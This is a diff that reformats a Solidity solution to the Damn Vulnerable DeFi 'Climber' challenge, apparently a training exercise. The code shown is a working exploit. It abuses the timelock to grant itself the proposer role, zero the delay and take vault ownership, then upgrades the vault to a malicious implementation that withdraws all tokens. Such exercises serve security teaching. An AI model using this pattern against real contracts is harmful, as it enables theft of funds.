@@ -89,8 +89,8 @@ contract ClimberChallenge is Test {
         Attack attack = new Attack(payable(timelock), address(vault));
         attack.timelockExecute();
         MaliciousClimberVault newVaultImpl = new MaliciousClimberVault();
-        vault.upgradeToAndCall(address(newVaultImpl),"");
-        MaliciousClimberVault(address(vault)).withdrawAll(address(token),recovery);
+        vault.upgradeToAndCall(address(newVaultImpl), "");
+        MaliciousClimberVault(address(vault)).withdrawAll(address(token), recovery);
     }
 
     /**
@@ -115,9 +115,7 @@ contract Attack {
         address vault = _vault;
         targets = [_timelock, _timelock, vault, address(this)];
 
-        elements[0] = (
-            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
-        );
+        elements[0] = (abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));
         elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
         elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
         elements[3] = abi.encodeWithSignature("timelockSchedule()");
@@ -133,15 +131,14 @@ contract Attack {
 }
 
 contract MaliciousClimberVault is ClimberVault {
-/// @custom:oz-upgrades-unsafe-allow constructor
+    /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() {
         _disableInitializers();
     }
+
     function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
         // withdraw the whole token balance from the contract
         DamnValuableToken token = DamnValuableToken(tokenAddress);
         require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
     }
 }
-
-
